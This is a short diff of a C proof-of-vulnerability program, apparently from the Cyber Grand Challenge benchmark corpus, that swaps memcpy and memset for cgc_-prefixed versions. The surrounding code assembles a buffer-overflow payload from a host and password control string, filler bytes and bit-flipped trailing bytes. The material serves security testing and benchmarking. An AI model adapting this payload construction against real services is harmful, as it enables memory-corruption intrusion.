@@ -10,9 +10,9 @@ int main(void) {
 
    transmit_all(1, "\x02""DEFAULT\n", 9);
 
-   memcpy(&ctrl[idx], "H192.168.0.1\nProot\nNTest\nT", 26);
+   cgc_memcpy(&ctrl[idx], "H192.168.0.1\nProot\nNTest\nT", 26);
    idx += 26;
-   memset(&ctrl[idx], 'B', 88);
+   cgc_memset(&ctrl[idx], 'B', 88);
    idx += 88;
 
    payload = append_buf(payload, &payload_len, ctrl, idx);
@@ -22,7 +22,7 @@ int main(void) {
        payload[payload_len - 8 + i] |= 0x01;
 
    idx = 1023 - payload_len;
-   memset(ctrl, 'A', idx);
+   cgc_memset(ctrl, 'A', idx);
    ctrl[idx++] = '\n';
 
    payload = append_buf(payload, &payload_len, ctrl, idx);
